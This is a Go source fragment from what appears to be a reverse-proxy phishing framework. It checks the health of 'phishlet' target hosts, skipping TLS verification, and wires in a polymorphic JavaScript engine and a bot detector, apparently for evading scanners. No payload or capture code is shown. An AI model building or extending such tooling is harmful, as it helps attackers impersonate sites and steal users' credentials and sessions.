// ValidateTargetURL проверяет доступность целевого URL
func (p *HTTPProxy) ValidateTargetURL(targetURL string) error {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Head(targetURL)
	if err != nil {
		return fmt.Errorf("target URL is unreachable: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("target URL returned error: %d", resp.StatusCode)
	}

	p.logger.Info("Target URL validated",
		zap.String("url", targetURL),
		zap.Int("status", resp.StatusCode))

	return nil
}

// CheckPhishletHealth проверяет доступность всех target URL в phishlet
func (p *HTTPProxy) CheckPhishletHealth(phishletID string) map[string]interface{} {
	result := map[string]interface{}{
		"phishlet_id": phishletID,
		"status":      "unknown",
		"targets":     []map[string]interface{}{},
	}

	phishlet, ok := p.phishlets[phishletID]
	if !ok {
		result["status"] = "not_found"
		return result
	}

	allHealthy := true
	targets := make([]map[string]interface{}, 0)

	for _, host := range phishlet.ProxyHosts {
		targetURL := fmt.Sprintf("https://%s.%s", host.OrigSub, host.Domain)

		targetResult := map[string]interface{}{
			"host":   targetURL,
			"status": "unknown",
		}

		if err := p.ValidateTargetURL(targetURL); err != nil {
			targetResult["status"] = "error"
			targetResult["error"] = err.Error()
			allHealthy = false
		} else {
			targetResult["status"] = "healthy"
		}

		targets = append(targets, targetResult)
	}

	result["targets"] = targets
	if allHealthy {
		result["status"] = "healthy"
	} else {
		result["status"] = "degraded"
	}

	return result
}

// SetEventBus sets event bus for v13 module integration
func (p *HTTPProxy) SetEventBus(bus *events.Bus) {
	p.eventBus = bus
}

// SetPolymorphicEngine sets polymorphic JS engine
func (p *HTTPProxy) SetPolymorphicEngine(e *polymorphic.Engine) {
	p.polyEngine = e
}

// SetBotDetector sets ML bot detector
func (p *HTTPProxy) SetBotDetector(d *ml.BotDetector) {
	p.botDetector = d
}

// Close gracefully shuts down the HTTP proxy (used by tests / shutdown logic)
func (p *HTTPProxy) Close() error {
	if p.server != nil {
		return p.server.Close()
	}
	return nil
}
